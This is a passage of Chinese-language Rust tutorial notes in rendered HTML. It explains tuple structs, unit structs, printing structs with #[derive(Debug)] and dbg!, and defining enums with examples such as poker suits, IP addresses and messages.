property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125; is &#123;&#125; bytes long\"</span><span class=\"token punctuation\">,</span> f1_name<span class=\"token punctuation\">,</span> f1_length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>file 结构体在内存中的排列如下图表示：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202503302009501.png\" alt=\"image-20250330200913250\" /></p>\n<p>这个图清晰的看出 File 结构体两个字符 name 和 data 分别拥有两个 [u8] 数组的所有权（Stringl 欸行的底层也是 [u8] 数组），通过 ptr 指针指向底层数组的内存地址，这里你可以把 ptr 指针理解为 Rust 中的引用类型</p>\n<p><strong>把结构体中具有所有权的字段转移出去后，将无法再访问该字段，但是可以正常访问其它的字段。</strong></p>\n<h3 id=\"元组结构体\"><a class=\"anchor\" href=\"#元组结构体\">#</a> 元组结构体：</h3>\n<p>结构体必须有名称，但是结构体的字段可以没有这个名称，这种结构体很想元组，所以称为元组结构体，例如：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Color</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Point</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">let</span> black<span class=\"token operator\">=</span><span class=\"token class-name\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">let</span> origin<span class=\"token operator\">=</span><span class=\"token class-name\">Point</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>元组结构体在你希望有一个整体名称，但是又不关心里面字段的名称时将非常有用。例如上面的  <code>Point</code>  元组结构体，众所周知 3D 点是  <code>(x, y, z)</code>  形式的坐标点，因此我们无需再为内部的字段逐一命名为： <code>x</code> ,  <code>y</code> ,  <code>z</code> 。</p>\n<h3 id=\"单元结构体\"><a class=\"anchor\" href=\"#单元结构体\">#</a> 单元结构体：</h3>\n<p>还记得之前讲过的基本没啥用的<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvYmFzZS10eXBlL2NoYXItYm9vbC5odG1sIyVFNSU4RCU5NSVFNSU4NSU4MyVFNyVCMSVCQiVFNSU5RSU4Qg==\">单元类型</span>吧？单元结构体就跟它很像，没有任何字段和属性，但是好在，它还挺有用。</p>\n<p>如果你定义一个类型，但是不关心该类型的内容，只关心它的行为时，就可以使用  <code>单元结构体</code> ：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">AlwaysEqual</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">let</span> subject <span class=\"token operator\">=</span> <span class=\"token class-name\">AlwaysEqual</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 我们不关心 AlwaysEqual 的字段数据，只关心它的行为，因此将它声明为单元结构体，然后再为它实现某个特征</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">impl</span> <span class=\"token class-name\">SomeTrait</span> <span class=\"token keyword\">for</span> <span class=\"token class-name\">AlwaysEqual</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>使用 #[derive (Debug)] 来打印结构体的信息</p>\n<p>结构体没有实现 Display 特征，主要原因是由于结构体的复杂性（结构名，子成员的名字，值，所有权归属不知道要输出哪一些），所以用 {} 行不通</p>\n<p>我们可以用 {：？} 来进行打印，但是会报错，</p>\n<pre><code>error[E0277]: `Rectangle` doesn't implement `Debug`\n= help: the trait `Debug` is not implemented for `Rectangle`\n= note: add `#[derive(Debug)]` to `Rectangle` or manually `impl Debug for Rectangle`\n\n\n</code></pre>\n<p>显示需要添加 #[derive (Debug)] 这条语句</p>\n<p>因为，rust 不会为我们实现 Debug，为了实现，我们有两条方式进行选择：</p>\n<pre><code>手动实现\n\n使用derive派生实现\n</code></pre>\n<p>后者简单得多，但是也有限制。如下使用就行：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token attribute attr-name\">#[derive(Debug)]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Rectangle</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    width<span class=\"token punctuation\">:</span> <span class=\"token keyword\">u32</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    height<span class=\"token punctuation\">:</span> <span class=\"token keyword\">u32</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">let</span> rect1 <span class=\"token operator\">=</span> <span class=\"token class-name\">Rectangle</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        width<span class=\"token punctuation\">:</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        height<span class=\"token punctuation\">:</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rect1 is &#123;:?&#125;\"</span><span class=\"token punctuation\">,</span> rect1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>输出：</p>\n<pre><code>$ cargo run\nrect1 is Rectangle &#123; width: 30, height: 50 &#125;\n</code></pre>\n<p>我们还可以用 dbg! 来打印</p>\n<pre><code>dbg! 输出到标准错误输出 stderr，而 println! 输出到标准输出 stdout。\n</code></pre>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token attribute attr-name\">#[derive(Debug)]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Rectangle</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    width<span class=\"token punctuation\">:</span> <span class=\"token keyword\">u32</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    height<span class=\"token punctuation\">:</span> <span class=\"token keyword\">u32</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">let</span> scale <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">let</span> rect1 <span class=\"token operator\">=</span> <span class=\"token class-name\">Rectangle</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        width<span class=\"token punctuation\">:</span> <span class=\"token macro property\">dbg!</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span> <span class=\"token operator\">*</span> scale<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        height<span class=\"token punctuation\">:</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token macro property\">dbg!</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>rect1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><pre><code>[4.rs:10:16] 30 * scale = 60\n[4.rs:14:5] &amp;rect1 = Rectangle &#123;\n    width: 60,\n    height: 50,\n&#125;\n</code></pre>\n<p>这下就全都有了</p>\n<h2 id=\"枚举\"><a class=\"anchor\" href=\"#枚举\">#</a> 枚举</h2>\n<h3 id=\"枚举-2\"><a class=\"anchor\" href=\"#枚举-2\">#</a> 枚举：</h3>\n<p>例子：</p>\n<p>枚举 (enum 或 enumeration) 允许你通过列举可能的成员来定义一个<strong>枚举类型</strong>，例如扑克牌花色：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">PokerSuit</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">Clubs</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token class-name\">Spades</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token class-name\">Diamonds</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token class-name\">Hearts</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><strong>枚举类型是一个类型，它会包含所有可能的枚举成员，而枚举值是该类型中的具体某个成员的实例。</strong></p>\n<h3 id=\"枚举值\"><a class=\"anchor\" href=\"#枚举值\">#</a> 枚举值：</h3>\n<p>创建枚举类型的两个成员实例：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> heart<span class=\"token operator\">=</span><span class=\"token class-name\">PokerSuit</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hearts</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">let</span> diamond<span class=\"token operator\">=</span><span class=\"token class-name\">PokerSuit</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Diamonds</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>我们通过：：操作符来访问 PokerSuit 下的具体成员，从代码可以清晰的看出，heart 和 diamond 都是 PokerSuit 枚举类型的，接着可以定义一个函数来使用他们：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token attribute attr-name\">#[derive(Debug)]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">PokerSuit</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">Clubs</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token class-name\">Spades</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token class-name\">Diamonds</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token class-name\">Hearts</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">let</span> heart <span class=\"token operator\">=</span> <span class=\"token class-name\">PokerSuit</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hearts</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">let</span> diamond <span class=\"token operator\">=</span> <span class=\"token class-name\">PokerSuit</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Diamonds</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">print_suit</span><span class=\"token punctuation\">(</span>heart<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">print_suit</span><span class=\"token punctuation\">(</span>diamond<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">print_suit</span><span class=\"token punctuation\">(</span>card<span class=\"token punctuation\">:</span> <span class=\"token class-name\">PokerSuit</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\">// 需要在定义 enum PokerSuit 的上面添加上 #[derive (Debug)]，否则会报 card 没有实现 Debug</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;:?&#125;\"</span><span class=\"token punctuation\">,</span>card<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>print_suit</code>  函数的参数类型是  <code>PokerSuit</code> ，因此我们可以把  <code>heart</code>  和  <code>diamond</code>  传给它，虽然  <code>heart</code>  是基于  <code>PokerSuit</code>  下的  <code>Hearts</code>  成员实例化的，但是它是货真价实的  <code>PokerSuit</code>  枚举类型。</p>\n<p>接下来，我们想让扑克牌变得更加实用，那么需要给每张牌赋予一个值： <code>A</code> (1)- <code>K</code>  (13)，这样再加上花色，就是一张真实的扑克牌了，例如红心 A。</p>\n<p>目前来说，枚举值还不能带有值，因此先用结构体来实现：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">PokerSuit</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token class-name\">Clubs</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">Spades</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token class-name\">Diamonds</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token class-name\">Hearts</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">PokerCard</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    suit<span class=\"token punctuation\">:</span> <span class=\"token class-name\">PokerSuit</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    value<span class=\"token punctuation\">:</span> <span class=\"token keyword\">u8</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token keyword\">let</span> c1 <span class=\"token operator\">=</span> <span class=\"token class-name\">PokerCard</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>       suit<span class=\"token punctuation\">:</span> <span class=\"token class-name\">PokerSuit</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Clubs</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>       value<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   <span class=\"token keyword\">let</span> c2 <span class=\"token operator\">=</span> <span class=\"token class-name\">PokerCard</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>       suit<span class=\"token punctuation\">:</span> <span class=\"token class-name\">PokerSuit</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Diamonds</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>       value<span class=\"token punctuation\">:</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>还有更简单的写法：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">PokerCard</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token class-name\">Clubs</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">u8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">Spades</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">u8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token class-name\">Diamonds</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">u8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token class-name\">Hearts</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">u8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   <span class=\"token keyword\">let</span> c1 <span class=\"token operator\">=</span> <span class=\"token class-name\">PokerCard</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Spades</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token keyword\">let</span> c2 <span class=\"token operator\">=</span> <span class=\"token class-name\">PokerCard</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Diamonds</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>再复杂一点：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Ipv4Addr</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token comment\">// --snip--</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Ipv6Addr</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// --snip--</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">IpAddr</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token constant\">V4</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Ipv4Addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token constant\">V6</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Ipv6Addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里面就是 Ipv4Addr，Ipv6Addr 之类的结构体来定义两种不同的 IP 数据。</p>\n<p>这样证明：任何类型的数据都可以放入枚举成员中</p>\n<p>增加一些挑战？先看以下代码：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Message</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token class-name\">Quit</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">Move</span> <span class=\"token punctuation\">&#123;</span> x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token class-name\">Write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token class-name\">ChangeColor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">let</span> m1 <span class=\"token operator\">=</span> <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Quit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">let</span> m2 <span class=\"token operator\">=</span> <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Move</span><span class=\"token punctuation\">&#123;</span>x<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">let</span> m3 <span class=\"token operator\">=</span> <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">ChangeColor</span><span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>该枚举类型代表一条消息，它包含四个不同的成员：</p>\n<ul>\n<li><code>Quit</code>  没有任何关联数据</li>\n<li><code>Move</code>  包含一个匿名结构体</li>\n<li><code>Write</code>  包含一个  <code>String</code>  字符串</li>\n<li><code>ChangeColor</code>  包含三个  <code>i32</code></li>\n</ul>\n<p>当然，我们也可以用结构体的方式来定义这些消息：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">QuitMessage</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 单元结构体</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">MoveMessage</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">WriteMessage</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 元组结构体</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">ChangeColorMessage</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 元组结构体</span></pre></td></tr></table></figure><p>由于每个结构体都有自己的类型，因此我们无法在需要同一类型的地方进行使用，例如某个函数它的功能是接受消息并进行发送，那么用枚举的方式，就可以接收不同的消息，但是用结构体，该函数无法接受 4 